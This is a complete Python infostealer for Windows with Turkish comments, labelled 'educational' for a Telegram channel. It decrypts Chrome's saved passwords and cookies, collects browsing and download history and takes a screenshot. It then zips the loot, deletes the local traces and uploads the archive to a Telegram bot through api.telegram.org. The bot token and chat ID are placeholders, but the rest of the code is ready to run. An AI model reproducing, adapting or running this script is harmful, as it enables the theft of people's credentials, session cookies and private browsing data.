#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import os,shutil,sqlite3,win32crypt
from PIL import ImageGrab
import zipfile
import requests

KullaniciAdi = os.getlogin()
ChromeYolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
AppData = os.getenv("APPDATA") + '\\'

def ChromePass():
    if os.path.exists(ChromeYolu + 'Login Data'):
        
        # DB'yi Kopyala
        shutil.copy2(ChromeYolu + 'Login Data', AppData + '{}_LoginData.sql'.format(KullaniciAdi))
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(AppData + '{}_LoginData.sql'.format(KullaniciAdi))
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
        file = open(AppData + '{}_ChromePass.txt'.format(KullaniciAdi), "w+") #
        file.write(Banner)
        file.close()
        
        # Sonuçları getir
        GelenVeri = []
        cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            # Login ve URL Kolonları
            login = result[1]
            url = result[0]
            
            try:
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                if login and url and password:
                    data = '='*100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password +'\n' + '='*100
                    GelenVeri.append(data)
            except:
                pass
        
        for Sonuc in GelenVeri:
            file = open(AppData + '{}_ChromePass.txt'.format(KullaniciAdi), "a+") #
            file.write(Sonuc + '\n')
            file.close()

def ChromeCookies():
    if os.path.exists(ChromeYolu + 'Cookies'):
        
        # DB'yi Kopyala
        shutil.copy2(ChromeYolu + 'Cookies', AppData + '{}_Cookies.sql'.format(KullaniciAdi))
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(AppData + '{}_Cookies.sql'.format(KullaniciAdi))
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
        file = open(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi), "w+") #
        file.write(Banner)
        file.close()
        
        # Sonuçları getir
        GelenVeri = []
        cursor.execute('SELECT * from cookies')
        for result in cursor.fetchall():
            # url ve name Kolonları
            url = result[1]
            name = result[2]
            
            try:
                cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                if url and name and cookie:
                    data = '='*100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name +'\n' + '='*100
                    GelenVeri.append(data)
            except:
                pass
        
        for Sonuc in GelenVeri:
            file = open(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi), "a+") #
            file.write(Sonuc + '\n')
            file.close()

def ChromeDownloadHistory():
    if os.path.exists(ChromeYolu + 'History'):
        
        # DB'yi Kopyala
        shutil.copy2(ChromeYolu + 'History', AppData + '{}_History.sql'.format(KullaniciAdi))
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(AppData + '{}_History.sql'.format(KullaniciAdi))
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
        file = open(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi), "w+") #
        file.write(Banner)
        file.close()
        
        # Sonuçları getir
        GelenVeri = []
        cursor.execute('SELECT current_path, tab_url from downloads')
        for result in cursor.fetchall():
            # Dizin ve URL Kolonları
            Dizin = result[0]
            URL = result[1]
            
            try:
                if Dizin and URL:
                    data = '='*100 + '\nDizin: ' + Dizin + '\nURL: ' + URL +'\n' + '='*100
                    GelenVeri.append(data)
            except:
                pass
        
        for Sonuc in GelenVeri:
            file = open(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi), "a+") #
            file.write(Sonuc + '\n')
            file.close()

def ChromeURLHistory():
    if os.path.exists(ChromeYolu + 'History'):
        
        # DB'yi Kopyala
        shutil.copy2(ChromeYolu + 'History', AppData + '{}_History.sql'.format(KullaniciAdi))
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(AppData + '{}_History.sql'.format(KullaniciAdi))
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı URL Geçmişi\n\n'
        file = open(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi), "w+") #
        file.write(Banner)
        file.close()
        
        # Sonuçları getir
        GelenVeri = []
        cursor.execute('SELECT title, url from urls')
        for result in cursor.fetchall():
            # Baslik ve URL Kolonları
            Baslik = result[0]
            URL = result[1]
            
            try:
                if Baslik and URL:
                    data = '='*100 + '\nBaşlık: ' + Baslik + '\nURL: ' + URL +'\n' + '='*100
                    GelenVeri.append(data)
            except:
                pass
        
        for Sonuc in GelenVeri:
            try:
                file = open(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi), "a+") #
                file.write(Sonuc + '\n')
                file.close()
            except:
                pass

def ScreenShot():
    screen = ImageGrab.grab()
    screen.save(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))

ChromePass()
ChromeCookies()
ChromeDownloadHistory()
ChromeURLHistory()
ScreenShot()

def ZipFile():
    ZipName = AppData + '{}_LOG.zip'.format(KullaniciAdi)
    YeniZip = zipfile.ZipFile(ZipName,'w')
    YeniZip.write(AppData + '{}_ChromePass.txt'.format(KullaniciAdi))
    YeniZip.write(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi))
    YeniZip.write(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi))
    YeniZip.write(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi))
    YeniZip.write(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
    YeniZip.close()
ZipFile()

def imha():
    os.remove(AppData + '{}_ChromePass.txt'.format(KullaniciAdi))
    os.remove(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi))
    os.remove(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi))
    os.remove(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi))
    os.remove(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
    os.remove(AppData + '{}_LoginData.sql'.format(KullaniciAdi))
    os.remove(AppData + '{}_Cookies.sql'.format(KullaniciAdi))
    os.remove(AppData + '{}_History.sql'.format(KullaniciAdi))
imha()

def TelegramSend():
    Loglar = {'document': open(AppData + '{}_LOG.zip'.format(KullaniciAdi), 'rb')}
    Bot_Token = "XXXX:XXXX"                                # Bot Token
    Chat_ID = "XXXX"                                       # Chat ID
    requests.post("https://api.telegram.org/bot" + Bot_Token + "/sendDocument?chat_id=" + Chat_ID , files=Loglar)
TelegramSend()

os.remove(AppData + '{}_LOG.zip'.format(KullaniciAdi))